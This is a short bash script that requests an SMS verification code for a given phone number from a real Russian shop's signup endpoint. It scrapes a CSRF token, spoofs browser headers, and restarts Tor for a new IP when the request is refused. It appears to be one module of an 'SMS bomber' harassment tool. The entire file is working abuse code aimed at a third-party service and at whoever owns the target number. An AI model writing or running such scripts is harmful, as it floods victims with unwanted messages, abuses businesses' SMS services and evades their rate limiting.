#!/bin/bash

PHONE="$(echo "$1" | sed 's/+//')"

echo "+$PHONE"

COOKIEFILE="$RANDOM"cookie.txt

curl -s --retry 3 'https://volgodonsk.yabloko161.ru/' -c "$COOKIEFILE" -b "$COOKIEFILE" > /dev/null
TOKEN=$(cat "$COOKIEFILE" | grep csrftoken | sed -E 's/.*csrftoken\s+(\S+).*/\1/' | head -1)

RESULT=$(curl -s --retry 3 'https://volgodonsk.yabloko161.ru/ajax/sms_code' \
-c "$COOKIEFILE" -b "$COOKIEFILE" \
-H 'authority: volgodonsk.yabloko161.ru' \
-H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"' \
-H 'dnt: 1' \
-H 'sec-ch-ua-mobile: ?0' \
-H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36' \
-H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
-H 'accept: application/json, text/javascript, */*; q=0.01' \
-H 'x-requested-with: XMLHttpRequest' \
-H "x-csrftoken: $TOKEN" \
-H 'sec-ch-ua-platform: "Windows"' \
-H 'origin: https://volgodonsk.yabloko161.ru' \
-H 'sec-fetch-site: same-origin' \
-H 'sec-fetch-mode: cors' \
-H 'sec-fetch-dest: empty' \
-H 'referer: https://volgodonsk.yabloko161.ru/signup/?shop_ident=9&shop_ident=17' \
-H 'accept-language: ru-UA,ru;q=0.9' \
--data-raw "phone_num=%2B$PHONE&csrfmiddlewaretoken=" \
--compressed)

rm -rf "$COOKIEFILE"

if [ "$(echo "$RESULT" | grep -c -v 'error')" = "0" ]; then
  echo "$RESULT"
  echo "false"
  pkill -sighup tor 2>/dev/null
else
  echo "true"
fi
